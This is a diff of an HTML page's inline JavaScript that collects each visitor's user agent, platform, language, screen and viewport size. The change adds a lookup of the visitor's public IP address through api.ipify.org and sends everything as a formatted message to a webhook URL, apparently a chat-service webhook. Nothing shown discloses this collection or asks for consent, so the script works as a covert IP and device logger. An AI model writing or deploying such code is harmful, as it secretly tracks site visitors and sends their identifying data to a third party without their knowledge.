@@ -21,31 +21,41 @@
                 viewportSize: `${window.innerWidth}x${window.innerHeight}`
             };
 
-            var payload = {
-                content: `Device Info: 
-                \nUser Agent: ${deviceInfo.userAgent} 
-                \nPlatform: ${deviceInfo.platform} 
-                \nLanguage: ${deviceInfo.language} 
-                \nScreen Resolution: ${deviceInfo.screenResolution} 
-                \nViewport Size: ${deviceInfo.viewportSize}`
-            };
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    deviceInfo.ipAddress = data.ip;
 
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                console.log('Webhook sent successfully');
-            })
-            .catch(error => {
-                console.error('There was a problem with the fetch operation:', error);
-            });
+                    var payload = {
+                        content: `**Device Info:**\n` +
+                                 `**User Agent:** ${deviceInfo.userAgent}\n` +
+                                 `**Platform:** ${deviceInfo.platform}\n` +
+                                 `**Language:** ${deviceInfo.language}\n` +
+                                 `**Screen Resolution:** ${deviceInfo.screenResolution}\n` +
+                                 `**Viewport Size:** ${deviceInfo.viewportSize}\n` +
+                                 `**IP Address:** ${deviceInfo.ipAddress}`
+                    };
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        console.log('Webhook sent successfully');
+                    })
+                    .catch(error => {
+                        console.error('There was a problem with the fetch operation:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('There was a problem with the IP fetch operation:', error);
+                });
         }
     </script>
     <div class="container">
